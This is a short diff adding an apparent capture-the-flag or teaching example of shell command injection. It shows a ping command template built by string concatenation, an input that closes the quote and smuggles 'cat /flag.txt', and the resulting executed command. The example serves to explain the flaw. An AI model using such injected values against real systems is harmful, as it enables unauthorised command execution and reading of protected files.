@@ -1,0 +1,8 @@
+command template:
+'ping -c 1 "' + ip + '"'
+
+input:
+8.8.8.8";cat /flag.txt;#
+
+command executed:
+ping -c 1 "8.8.8.8";cat /flag.txt;#"
